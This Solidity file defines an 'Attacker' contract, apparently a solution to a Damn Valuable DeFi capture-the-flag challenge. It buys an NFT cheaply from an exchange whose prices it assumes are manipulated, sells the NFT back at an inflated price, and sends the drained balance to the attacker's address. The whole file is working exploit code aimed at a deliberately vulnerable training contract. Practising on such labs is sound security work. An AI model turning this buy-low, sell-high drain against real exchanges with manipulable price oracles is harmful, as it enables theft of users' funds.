// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Exchange} from "./Exchange.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {ERC721} from "openzeppelin-contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker is IERC721Receiver {
    address public immutable attacker;

    Exchange public immutable ex;
    DamnValuableNFT public immutable token;

    constructor(address attackerAddress, address payable exchangeAddress, address tokenAddress) {
        attacker = attackerAddress;
        ex = Exchange(exchangeAddress);
        token = DamnValuableNFT(tokenAddress);
    }

    // buy nft from the exchange at cheap rates cuz we can manipulate
    // prices
    function buyNftForCheap() external payable {
        ex.buyOne{value: msg.value}();
    }

    // sell nft to the exchange at expensive rates cuz we can manipulate
    // prices
    function sellForExpensive() external {
        token.approve(address(ex), 0);
        ex.sellOne(0);
    }

    // transfer all the funds from this contract to attacker EOA
    function transferFundsToAttackersAddress() external {
        payable(attacker).transfer(address(this).balance);
    }

    // to all this contract to receive the nft
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
